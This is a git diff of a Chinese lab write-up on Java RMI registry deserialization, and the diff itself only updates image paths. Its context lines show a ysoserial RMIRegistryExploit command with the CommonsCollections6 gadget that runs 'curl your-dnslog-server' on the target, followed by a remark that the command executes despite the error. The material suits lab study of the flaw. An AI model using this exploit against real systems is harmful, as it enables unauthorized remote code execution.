@@ -25,8 +25,8 @@ docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"
 ```
 
-![image-20220224142802160](images/202202241428503.png)
+![image-20220224142802160](../.gitbook/assets/202202241428503.png)
 
 Registry 会返回报错，但命令会正常执行。可以看到 dnslog 成功接收请求。
 
-![image-20220224142736669](images/202202241427738.png)
+![image-20220224142736669](../%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/images/202202241427738.png)
